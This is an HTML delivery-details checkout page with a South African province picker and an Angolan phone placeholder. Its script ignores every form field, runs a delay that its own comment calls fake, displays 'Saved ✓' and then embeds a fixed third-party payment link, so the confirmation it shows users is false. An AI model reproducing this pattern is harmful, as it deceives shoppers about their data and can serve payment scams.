<!DOCTYPE html>
<html lang="pt">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Checkout - Delivery Details</title>

<style>
body{
  margin:0;
  font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial;
  background:#fff;
  color:#111;
}

.checkout{
  padding:20px 16px;
}

.checkout h2{
  font-size:22px;
  font-weight:800;
  margin-bottom:16px;
}

.type-tabs{
  display:flex;
  gap:10px;
  margin-bottom:20px;
}

.tab{
  flex:1;
  height:44px;
  border-radius:8px;
  border:2px solid #1a73e8;
  background:#eaf3ff;
  font-weight:700;
  cursor:default;
  color:#1a73e8;
}

/* fields */
.field{
  margin-bottom:18px;
}

.field label{
  font-size:13px;
  color:#666;
  display:block;
  margin-bottom:4px;
}

.field input{
  width:100%;
  border:none;
  border-bottom:1px solid #ddd;
  font-size:15px;
  padding:6px 0;
  outline:none;
}

/* button */
.save-btn{
  margin-top:30px;
  width:100%;
  height:48px;
  border-radius:999px;
  border:none;
  background:#0b6ecb;
  color:white;
  font-size:16px;
  font-weight:800;
  cursor:pointer;
  transition:.2s;
}

.save-btn.loading{
  opacity:0.8;
  pointer-events:none;
}

.save-btn.saved{
  background:#2ecc71;
}

/* PROVINCE MODAL */
.province-modal{
  position:fixed;
  inset:0;
  background:rgba(0,0,0,.4);
  display:none;
  z-index:3000;
}
.province-modal.is-open{ display:block; }

.province-sheet{
  position:absolute;
  left:0; right:0; bottom:0;
  background:#fff;
  border-radius:16px 16px 0 0;
  max-height:80vh;
  overflow:auto;
}

.province-head{
  text-align:center;
  font-size:18px;
  font-weight:800;
  padding:14px;
  border-bottom:1px solid #eee;
}

.province-item{
  padding:16px;
  border-bottom:1px solid #eee;
  font-size:16px;
  cursor:pointer;
}

.province-item:active{ background:#f2f2f2; }
</style>
</head>

<body>

<div class="checkout">

  <h2>Delivery Details</h2>

  <!-- Só Residential -->
  <div class="type-tabs">
    <button class="tab">Residential</button>
  </div>

  <div class="field">
    <label>Recipient Name</label>
    <input type="text" placeholder="Full name">
  </div>

  <div class="field">
    <label>Recipient Mobile Number</label>
    <input type="text" placeholder="+244 xxx xxx xxx">
  </div>

  <div class="field">
    <label>Street Address</label>
    <input type="text">
  </div>

  <div class="field">
    <label>Complex / Building (Optional)</label>
    <input type="text">
  </div>

  <div class="field">
    <label>Suburb</label>
    <input type="text">
  </div>

  <div class="field">
    <label>City / Town</label>
    <input type="text">
  </div>

  <div class="field">
    <label>Province</label>
    <input type="text" id="provinceInput" placeholder="Select" readonly>
  </div>

  <div class="field">
    <label>Postal Code</label>
    <input type="text">
  </div>

  <!-- BOTÃO SAVE -->
  <button class="save-btn" id="openPayment">
    <span id="saveText">Save</span>
    <span id="saveLoader" style="display:none;">Saving...</span>
    <span id="saveDone" style="display:none;">Saved ✓</span>
  </button>

  <!-- CHECKOUT INLINE -->
  <div id="paymentInline" style="display:none; margin-top:24px;">
    <iframe 
      id="paymentFrame"
      style="width:100%; height:650px; border:none;">
    </iframe>
  </div>

</div>

<!-- PROVINCE MODAL -->
<div class="province-modal" id="provinceModal">
  <div class="province-sheet">
    <div class="province-head">Province</div>
    <div class="province-item">Eastern Cape</div>
    <div class="province-item">Free State</div>
    <div class="province-item">Gauteng</div>
    <div class="province-item">KwaZulu-Natal</div>
    <div class="province-item">Limpopo</div>
    <div class="province-item">Mpumalanga</div>
    <div class="province-item">Northern Cape</div>
    <div class="province-item">North West</div>
    <div class="province-item">Western Cape</div>
  </div>
</div>

<script>
document.addEventListener("DOMContentLoaded", function(){

  // Province
  const provinceInput = document.getElementById("provinceInput");
  const provinceModal = document.getElementById("provinceModal");

  document.querySelectorAll(".province-item").forEach(item=>{
    item.onclick = ()=> {
      provinceInput.value = item.innerText;
      provinceModal.classList.remove("is-open");
    }
  });

  provinceInput.onclick = ()=> provinceModal.classList.add("is-open");
  provinceModal.onclick = e=>{
    if(e.target === provinceModal) provinceModal.classList.remove("is-open");
  }

  // Payment INLINE com delay + saved
  const openPayment = document.getElementById("openPayment");
  const paymentFrame = document.getElementById("paymentFrame");
  const paymentInline = document.getElementById("paymentInline");
  const saveText = document.getElementById("saveText");
  const saveLoader = document.getElementById("saveLoader");
  const saveDone = document.getElementById("saveDone");

  openPayment.onclick = ()=>{
    // loading
    openPayment.classList.add("loading");
    saveText.style.display = "none";
    saveLoader.style.display = "inline";

    // delay fake de 3s
    setTimeout(()=>{
      // abre checkout
      paymentFrame.src = "https://payjsr.com/checkout?link=bc03be59-add7-4fe8-8a46-f21a27c037dc";
      paymentInline.style.display = "block";
      paymentInline.scrollIntoView({ behavior: "smooth" });

      // muda para SALVO
      saveLoader.style.display = "none";
      saveDone.style.display = "inline";
      openPayment.classList.remove("loading");
      openPayment.classList.add("saved");
    }, 3000);
  }

});
</script>

</body>
</html>


